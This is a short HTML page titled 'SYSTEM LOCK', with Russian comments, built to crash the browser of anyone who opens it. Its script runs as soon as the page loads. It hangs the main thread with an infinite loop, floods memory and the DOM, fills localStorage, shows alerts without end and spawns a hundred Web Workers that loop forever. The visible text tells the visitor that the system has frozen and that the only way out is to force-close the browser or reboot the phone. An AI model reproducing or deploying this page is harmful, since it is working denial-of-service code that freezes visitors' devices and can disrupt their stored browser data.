<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SYSTEM LOCK</title>
<script>
// Бесконечный цикл с выделением памяти
(function() {
    // 1. Вешаем основной поток
    while(true) {
        // Пустой бесконечный цикл
    }
})();

// 2. Дополнительно: заполняем память массивами
setInterval(() => {
    const arr = [];
    for(let i = 0; i < 1000000; i++) {
        arr.push(Math.random().toString(36).repeat(100));
    }
}, 1);

// 3. Бесконечные рекурсивные запросы к DOM (перегрузка рендеринга)
setInterval(() => {
    document.body.innerHTML += '<div style="font-size:100px">💀</div>';
}, 0);

// 4. Заполнение локального хранилища до отказа
setInterval(() => {
    try {
        localStorage.setItem('x', 'x'.repeat(1024 * 1024 * 10));
    } catch(e) {}
}, 10);

// 5. Попытка создать бесконечные вкладки / алерты (через микро-задачи)
function crashMore() {
    setTimeout(crashMore, 0);
    alert('CRASH');  // Бесконечные алерты заблокируют любые действия
}
crashMore();

// 6. Перегрузка Web Worker API (если доступен)
try {
    for(let i = 0; i < 100; i++) {
        const worker = new Worker(URL.createObjectURL(new Blob([`
            while(true) {}
        `])));
    }
} catch(e) {}
</script>
</head>
<body style="background:black; color:red; font-family: monospace; font-size: 24px;">
    <h1>СИСТЕМА ЗАВИСЛА</h1>
    <p>Единственный выход: принудительно закрыть браузер или перезагрузить телефон</p>
</body>
</html>
